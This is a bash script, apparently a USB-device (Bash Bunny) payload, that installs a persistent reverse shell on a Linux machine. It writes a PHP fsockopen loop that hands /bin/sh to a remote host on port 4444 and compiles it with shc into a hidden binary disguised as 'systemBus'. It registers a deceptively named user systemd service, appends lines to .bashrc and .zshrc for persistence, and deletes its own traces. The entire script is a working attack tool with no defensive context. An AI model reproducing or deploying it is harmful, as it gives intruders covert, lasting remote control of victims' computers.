#!/bin/bash
lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
mkdir /var/tmp/.system/
echo -e "#!"/bin/bash"\nwhile :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"/bin/sh -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/pop
cp -r $mntt/payloads/library/persistentReverseBunny/shc /var/tmp/.system/
chmod +x /var/tmp/.system/shc
/var/tmp/.system/./shc -f /var/tmp/.system/pop -o /var/tmp/.system/systemBus
chmod +x /var/tmp/.system/systemBus
rm /var/tmp/.system/pop*
mkdir -p ~/.config/systemd/user
echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
systemctl --user daemon-reload
systemctl --user enable --now systemBUS.service
systemctl --user start --now systemBUS.service
echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ $? = 0 ]; then\n\techo systemctl --user enable --now systemBUS.service >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ $? = 0 ]; then\n\techo systemctl --user enable --now systemBUS.service >> ~/.bashrc\nfi\n\n" > ~/tmmmp
chmod +x ~/tmmmp && ~/./tmmmp && rm ~/tmmmp && rm /tmp/payload.sh && rm /var/tmp/.system/shc
